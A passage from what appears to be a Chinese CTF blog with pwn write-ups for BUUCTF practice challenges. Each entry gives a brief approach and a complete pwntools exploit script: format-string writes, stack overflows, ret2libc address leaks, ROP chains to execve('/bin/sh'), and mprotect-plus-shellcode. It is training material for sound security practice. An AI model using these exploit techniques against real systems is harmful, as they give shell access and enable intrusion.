class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27945</span>)<br><br>bss_addr = <span class="hljs-number">0x804c044</span><br><br>payload = p32(bss_addr)+p32(bss_addr+<span class="hljs-number">1</span>)+p32(bss_addr+<span class="hljs-number">2</span>)+p32(bss_addr+<span class="hljs-number">3</span>)+<span class="hljs-string">b&#x27;%10$n&#x27;</span>+<span class="hljs-string">b&#x27;%11$n&#x27;</span>+<span class="hljs-string">b&#x27;%12$n&#x27;</span>+<span class="hljs-string">b&#x27;%13$n&#x27;</span><br><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;passwd:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10101010</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>32位函数调用传参</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">27981</span>)<br><br>hint_addr = <span class="hljs-number">0x804A024</span><br>system_addr = <span class="hljs-number">0x8048320</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">136</span>+<span class="hljs-number">4</span>)+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(hint_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>覆盖<code>var[13]</code>成0x11即可</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./ciscn_2019_n_8&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node5.buuoj.cn&quot;,25702)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">52</span>+p32(<span class="hljs-number">0x11</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;name&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>ret2text</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#p = process(&quot;./bjdctf_2020_babystack&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27726</span>)<br><br>backdoor = <span class="hljs-number">0x4006e7</span><br><br>payload = <span class="hljs-string">b&#x27;100&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&quot;length&quot;</span>)<br>p.sendline(payload)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(backdoor)<br>p.recvuntil(<span class="hljs-string">b&quot;What&#x27;s u name?&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><p>ret2libc，利用puts泄露地址</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26179</span>)<br><span class="hljs-comment">#p = process(&#x27;./ciscn_2019_c_1&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br>encrypt = <span class="hljs-number">0x4009a0</span><br><br>puts_offset = <span class="hljs-number">0x0809c0</span><br>system_offset = <span class="hljs-number">0x04f440</span><br>binsh_offset = <span class="hljs-number">0x1b3e9a</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your choice!&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Ciphertext&quot;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">8</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>info(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - puts_offset<br>system_addr = libc_base + system_offset<br>binsh_addr = libc_base + binsh_offset<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><p>三种思路</p><ol><li>溢出到get_flag然后再溢出到exit，使程序正常退出并给我们回显flag</li><li>利用系统调用获取shell</li><li>利用mprotect修改保护情况，再写shellcode</li></ol><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><h4 id="get-flag-exit"><a href="#get-flag-exit" class="headerlink" title="get_flag + exit"></a>get_flag + exit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26800</span>)<br><span class="hljs-comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span><br><span class="hljs-comment">#context(log_level=&quot;debug&quot;)</span><br><br>param1 = <span class="hljs-number">0x308cd64f</span><br>param2 = <span class="hljs-number">0x195719d1</span><br>get_flag = <span class="hljs-number">0x080489a0</span><br><span class="hljs-comment">#get_flag = 0x80489b8</span><br>exit_addr=<span class="hljs-number">0x804e6a0</span><br>sleep(<span class="hljs-number">0.1</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span><br>payload+=p32(get_flag)<br>payload+=p32(exit_addr)<br>payload+=p32(param1)<br>payload+=p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25556</span>) <br><br>pop_eax = <span class="hljs-number">0x080b91e6</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806fc30</span><br>int_0x80 = <span class="hljs-number">0x0806d7e5</span><br>bin_sh = <span class="hljs-number">0x80eb050</span><br>mov_edx_eax = <span class="hljs-number">0x080557ab</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">56</span>+p32(pop_eax)+<span class="hljs-string">b&#x27;/bin&#x27;</span>+ p32(pop_edx_ecx_ebx)+p32(bin_sh)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(mov_edx_eax) <span class="hljs-comment"># 写&#x27;/bin&#x27;</span><br>payload+= p32(pop_eax)+<span class="hljs-string">b&#x27;/sh\x00&#x27;</span>+p32(pop_edx_ecx_ebx)+p32(bin_sh+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(mov_edx_eax) <span class="hljs-comment"># 写&#x27;/sh\x00&#x27;</span><br>payload+= p32(pop_eax)+p32(<span class="hljs-number">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)+p32(int_0x80) <span class="hljs-comment"># 系统调用</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="mprotect-shellcode"><a href="#mprotect-shellcode" class="headerlink" title="mprotect + shellcode"></a>mprotect + shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28056</span>)<br><span class="hljs-comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span><br><span class="hljs-comment">#context(log_level=&quot;debug&quot;)</span><br><br>param1 = <span class="hljs-number">0x308cd64f</span><br>param2 = <span class="hljs-number">0x195719d1</span><br>get_flag = <span class="hljs-number">0x080489a0</span><br>exit_addr=<span class="hljs-number">0x804e6a0</span><br>mprotect_addr=<span class="hljs-number">0x806ec80</span><br>buf = <span class="hljs-number">0x80ea000</span><br>read_addr=<span class="hljs-number">0x806e140</span><br>pop_3_ret=<span class="hljs-number">0x804f460</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span><br>payload+=p32(mprotect_addr)<br>payload+=p32(pop_3_ret)<br>payload+=p32(buf)<br>payload+=p32(<span class="hljs-number">0x1000</span>)<br>payload+=p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read_addr)<br>payload+=p32(buf)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(buf)<br>payload+=p32(<span class="hljs-number">0x100</span>)<br><br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br><br>shellcode = asm(shellcraft.sh(),arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><h3 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h3><p>64位传参</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./level2_x64&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25059</span>)<br><br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>hint = <span class="hljs-number">0x600a90</span><br>system_addr = <span class="hljs-number">0x400603</span><br>pop_rdi_ret = <span class="hljs-number">0x4006b3</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">128</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(hint) + p64(system_addr)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Input:&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><h3 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h3><p>64位传参</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./babyrop&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26483</span>)<br><br>binsh = <span class="hljs-number">0x601048</span><br>pop_rdi = <span class="hljs-number">0x400683</span><br>system_addr = <span class="hljs-number">0x4005E3</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">16</span>+<span class="hljs-number">8</span>) + p64(pop_rdi) + p64(binsh) + p64(system_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><h3 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h3><p>ret2libc，利用write泄露地址</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29568</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main = <span class="hljs-number">0x08048825</span><br><br>write_offset = libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br>system_offset = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_offset = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br><br>payload1 = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">6</span>+<span class="hljs-string">b&#x27;\xFF&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">10</span><br>p.sendline(payload1)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>)<br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">235</span> + p32(write_plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">8</span>)<br>p.sendline(payload2)<br><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#info(hex(write_addr))</span><br><br>libc_base = write_addr - write_offset<br>system_addr = libc_base + system_offset<br>binsh = libc_base + binsh_offset <br><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">235</span>+p32(system_addr)+p32(main)+p32(binsh)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><h3 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h3><p>直接连接就有shell了</p><h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><h3 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h3><p>ret2libc</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27559</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>ret = <span class="hljs-number">0x4004c9</span><br>pop_rdi = <span class="hljs-number">0x400713</span><br>main = <span class="hljs-number">0x400636</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;name\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.recvuntil(<span class="hljs-string">b&#x27;me?\n&#x27;</span>)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#info(hex(puts_addr))</span><br><br>system_addr = puts_addr - <span class="hljs-number">0x31580</span><br>binsh = puts_addr + <span class="hljs-number">0x1334da</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;name\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_addr)<br>p.recvuntil(<span class="hljs-string">b&#x27;me?\n&#x27;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><h3 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h3><p>利用write输出flag就好了</p><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27490</span>)<br><span class="hljs-comment">#p = process(&quot;./not_the_same_3dsctf_2016&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./not_the_same_3dsctf_2016&quot;)</span><br><br><span class="hljs-comment">#write_plt = elf.plt[&quot;write&quot;]</span><br>write_plt =<span class="hljs-number">0x0806E270</span><br>get_flag = <span class="hljs-number">0x080489A0</span><br>flag = <span class="hljs-number">0x080ECA2D</span><br>exit_addr = <span class="hljs-number">0x0804E660</span> <br>main = <span class="hljs-number">0x080489E0</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">45</span> + p32(get_flag) + p32(write_plt) + p32(exit_addr) + p32(<span class="hljs-number">1</span>) + p32(flag) + p32(<span class="hljs-number">100</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><h3 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h3><p>和之前第11题相同</p><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># same as 11</span><br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28455</span>)<br><span class="hljs-comment">#p = process(&#x27;./ciscn_2019_en_2&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_en_2&#x27;</span>)<br><br>puts_plt = 